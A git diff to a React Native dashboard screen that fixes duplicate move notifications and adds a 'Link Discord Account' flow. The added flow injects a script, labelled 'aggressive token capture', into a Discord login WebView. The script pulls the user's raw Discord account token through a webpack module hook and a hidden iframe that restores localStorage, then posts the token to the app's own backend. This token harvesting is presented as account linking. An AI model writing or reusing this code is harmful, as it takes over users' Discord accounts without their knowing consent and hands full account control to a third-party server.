@@ -30,8 +30,54 @@ export default function Dashboard({ user, setUser }) {
   const webViewRef = useRef(null);
   const lastSeenId = useRef(null);
   const [refreshing, setRefreshing] = useState(false);
+  const appBecameActiveTime = useRef(null); // Track when app became active
+  const isInitialLoad = useRef(true); // Track if this is the first load after app opens
+  const hasRedirectedToLogin = useRef(false);
 
   const getCacheKey = () => `cached_moves_${user?._id}_${selectedAccount || 'all'}`;
+
+  // AGGRESSIVE TOKEN CAPTURE SCRIPT (from SF.JS)
+  const INJECTED_JAVASCRIPT = `
+  (function() {
+    function capture() {
+      try {
+        // 1. TRY THE "WEBPACK" HOOK (Most reliable for Discord 2025)
+        const webpack = window.webpackChunkdiscord_app;
+        if (webpack) {
+          const m = webpack.push([[Symbol()], {}, (e) => e]);
+          for (const i in m.c) {
+            if (m.c[i].exports && m.c[i].exports.default && m.c[i].exports.default.getToken) {
+              const token = m.c[i].exports.default.getToken();
+              if (token && token.length > 20) {
+                window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: token}));
+                return true;
+              }
+            }
+          }
+        }
+
+        // 2. TRY THE "IFRAME RESTORATION" HOOK
+        // Discord deletes localStorage, but a new iframe can bring it back
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        const storage = iframe.contentWindow.localStorage;
+        const token = storage.getItem('token');
+        if (token) {
+          const clean = token.replace(/"/g, '');
+          window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
+          return true;
+        }
+      } catch (e) {}
+      return false;
+    }
+
+    // Check every 500ms
+    const timer = setInterval(() => {
+      if (capture()) clearInterval(timer);
+    }, 500);
+  })();
+`;
 
   useEffect(() => {
     if (!user) return;
@@ -76,6 +122,8 @@ export default function Dashboard({ user, setUser }) {
     const subscription = AppState.addEventListener('change', nextAppState => {
       if (nextAppState === 'active') {
         console.log('📱 App came to foreground, refreshing moves immediately...');
+        appBecameActiveTime.current = Date.now(); // Mark when app became active
+        isInitialLoad.current = true; // Mark as initial load
         fetchMoves();
       }
     });
@@ -143,14 +191,26 @@ export default function Dashboard({ user, setUser }) {
       
       const data = await res.json();
       if (Array.isArray(data)) {
-        if (
+        // On initial load after app opens, set lastSeenId without triggering notification
+        // This prevents duplicate notifications for moves that happened while app was closed
+        if (isInitialLoad.current && data.length > 0) {
+          lastSeenId.current = data[0]._id;
+          isInitialLoad.current = false; // Clear the flag after first load
+        } else if (
           lastSeenId.current &&
           data.length > 0 &&
           data[0]._id !== lastSeenId.current
         ) {
+          // Only trigger notification if:
+          // 1. We have a lastSeenId (not first time)
+          // 2. AND the move is actually new (different ID)
+          // 3. AND this is not the initial load (moves that happened while app was closed)
           triggerNotification(data[0]);
+          lastSeenId.current = data[0]._id;
+        } else if (data.length > 0 && !lastSeenId.current) {
+          // First time loading, just set the ID without notification
+          lastSeenId.current = data[0]._id;
         }
-        if (data.length > 0) lastSeenId.current = data[0]._id;
         
         setMoves(data);
         
@@ -223,6 +283,59 @@ export default function Dashboard({ user, setUser }) {
     navigation.navigate('Blocked');
   };
 
+  const onWebViewMessage = async (event) => {
+    try {
+      const message = JSON.parse(event.nativeEvent.data);
+      if (message.type === "TOKEN" && message.data) {
+        setShowWebView(false);
+        await sendTokenToBackend(message.data);
+      }
+    } catch (e) {
+      // Direct string fallback
+      if (event.nativeEvent.data && event.nativeEvent.data.length > 20) {
+        setShowWebView(false);
+        await sendTokenToBackend(event.nativeEvent.data);
+      }
+    }
+  };
+
+  const sendTokenToBackend = async (discordToken) => {
+    if (!user || !user.token) {
+      Alert.alert("Error", "Please login first");
+      return;
+    }
+
+    try {
+      const response = await fetch(`${API_URL}/link-discord`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": `Bearer ${user.token}`
+        },
+        body: JSON.stringify({ token: discordToken }),
+      });
+
+      const result = await response.json();
+      if (response.ok) {
+        Alert.alert("✅ Success", "Discord account linked successfully!");
+        await fetchAccounts(); // Refresh accounts list
+        fetchMoves(); // Refresh moves
+      } else {
+        Alert.alert("Error", result.error || "Failed to link Discord account");
+      }
+    } catch (error) {
+      console.error("Link Discord error:", error);
+      Alert.alert("Server Error", "Could not reach backend.");
+    }
+  };
+
+  const handleNavigationChange = (navState) => {
+    // If the browser reaches the chat/channels area, it means login is 100% done
+    if (navState.url.includes("/channels/") || navState.url.includes("/@me")) {
+      webViewRef.current?.injectJavaScript(INJECTED_JAVASCRIPT);
+    }
+  };
+
   if (paystackUrl)
     return (
       <View style={{ flex: 1, backgroundColor: "#fff" }}>
@@ -243,19 +356,43 @@ export default function Dashboard({ user, setUser }) {
   if (showWebView)
     return (
       <View style={{ flex: 1 }}>
+        <View style={styles.webHeader}>
+          <TouchableOpacity
+            onPress={() => {
+              hasRedirectedToLogin.current = false;
+              setShowWebView(false);
+              setWebviewUrl("https://discord.com/logout");
+            }}
+            style={styles.webHeaderButton}
+          >
+            <Text style={styles.webHeaderText}>Close</Text>
+          </TouchableOpacity>
+          <Text style={styles.webHeaderTitle}>Link Discord Account</Text>
+          <View style={{ width: 50 }} />
+        </View>
         <WebView
           ref={webViewRef}
+          incognito={true} // Use incognito mode to prevent cookie persistence
           source={{ uri: webviewUrl }}
+          injectedJavaScript={INJECTED_JAVASCRIPT}
           injectedJavaScriptBeforeContentLoaded={
-            webviewUrl && webviewUrl.includes("logout")
-              ? "window.localStorage && window.localStorage.clear(); window.sessionStorage && window.sessionStorage.clear();"
-              : undefined
+            "window.localStorage && window.localStorage.clear(); window.sessionStorage && window.sessionStorage.clear(); document.cookie.split(';').forEach(function(c) { document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/'); });"
           }
+          onMessage={onWebViewMessage}
+          onNavigationStateChange={handleNavigationChange}
           onLoadEnd={() => {
-            if (webviewUrl && webviewUrl.includes("logout")) {
-              setTimeout(() => setWebviewUrl("https://discord.com/login"), 600);
+            // Only redirect once, prevent infinite loop
+            if (webviewUrl && webviewUrl.includes("logout") && !hasRedirectedToLogin.current) {
+              hasRedirectedToLogin.current = true;
+              setTimeout(() => {
+                setWebviewUrl("https://discord.com/login");
+              }, 800);
             }
           }}
+          javaScriptEnabled={true}
+          domStorageEnabled={true}
+          sharedCookiesEnabled={false} // Prevent sharing cookies between sessions
+          userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
         />
       </View>
     );
@@ -275,7 +412,8 @@ export default function Dashboard({ user, setUser }) {
           <TouchableOpacity
             style={{ marginRight: 12 }}
             onPress={() => {
-              setWebviewUrl("https://discord.com/logout");
+              hasRedirectedToLogin.current = false; // Reset redirect flag
+              setWebviewUrl("https://discord.com/logout"); // Start with logout to clear session
               setShowWebView(true);
             }}
           >
@@ -394,7 +532,9 @@ const styles = StyleSheet.create({
     paddingTop: 50,
     paddingBottom: 15,
     backgroundColor: "#fff",
-    alignItems: "flex-start",
+    flexDirection: "row",
+    alignItems: "center",
+    justifyContent: "space-between",
     borderBottomWidth: 1,
     borderBottomColor: "#eee",
     paddingHorizontal: 16,
@@ -408,6 +548,13 @@ const styles = StyleSheet.create({
   webHeaderText: {
     color: "#fff",
     fontWeight: "bold",
+  },
+  webHeaderTitle: {
+    color: "#111827",
+    fontWeight: "bold",
+    fontSize: 16,
+    flex: 1,
+    textAlign: "center",
   },
 });
 
